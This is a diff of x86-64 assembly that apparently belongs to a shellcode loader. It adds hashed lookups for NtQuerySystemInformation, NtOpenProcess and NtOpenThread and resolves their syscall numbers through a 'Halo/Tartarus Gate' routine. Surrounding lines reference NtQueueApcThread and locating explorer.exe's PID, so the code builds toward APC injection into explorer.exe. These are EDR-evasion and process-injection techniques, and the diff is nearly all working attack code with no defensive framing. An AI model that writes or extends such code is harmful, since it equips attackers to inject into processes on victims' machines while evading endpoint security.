@@ -430,6 +430,21 @@ payload_entry:
     call .get_export_by_hash_payload
     mov [rbx + (pNtQueueApcThread - payload_start)], rax
 
+    mov rcx, r15
+    mov edx, 0xE4E1E2D6         ; NtQuerySystemInformation
+    call .get_export_by_hash_payload
+    mov [rbx + (pNtQuerySystemInformation - payload_start)], rax
+
+    mov rcx, r15
+    mov edx, 0xF74A9CA0         ; NtOpenProcess
+    call .get_export_by_hash_payload
+    mov [rbx + (pNtOpenProcess - payload_start)], rax
+
+    mov rcx, r15
+    mov edx, 0x59651F4C         ; NtOpenThread
+    call .get_export_by_hash_payload
+    mov [rbx + (pNtOpenThread - payload_start)], rax
+
     ; --- Halo/Tartarus Gate SSN ---
     mov rsi, [rbx + (pNtAllocateVirtualMemory - payload_start)]
     call .resolve_ssn_halotartarus_v7
@@ -448,6 +463,18 @@ payload_entry:
     test eax, eax
     jz .exit_v7
     mov [rbx + (ssn_NtQueueApcThread - payload_start)], eax
+
+    mov rsi, [rbx + (pNtQuerySystemInformation - payload_start)]
+    call .resolve_ssn_halotartarus_v7
+    mov [rbx + (ssn_NtQuerySystemInformation - payload_start)], eax
+
+    mov rsi, [rbx + (pNtOpenProcess - payload_start)]
+    call .resolve_ssn_halotartarus_v7
+    mov [rbx + (ssn_NtOpenProcess - payload_start)], eax
+
+    mov rsi, [rbx + (pNtOpenThread - payload_start)]
+    call .resolve_ssn_halotartarus_v7
+    mov [rbx + (ssn_NtOpenThread - payload_start)], eax
 
     ; --- Buscar PID de explorer.exe ---
     ; (Simplificado: en producción usar CreateToolhelp32Snapshot)
